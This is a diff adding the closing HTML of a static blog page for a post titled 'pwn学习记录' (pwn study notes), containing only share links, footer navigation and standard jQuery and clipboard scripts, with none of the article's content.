+  <li><a class="icon" href="mailto:?subject=pwn学习记录&body=Check out this article: https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=pwn学习记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&name=pwn学习记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://gl-zhou.github.io/2023/10/30/pwn%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&t=pwn学习记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
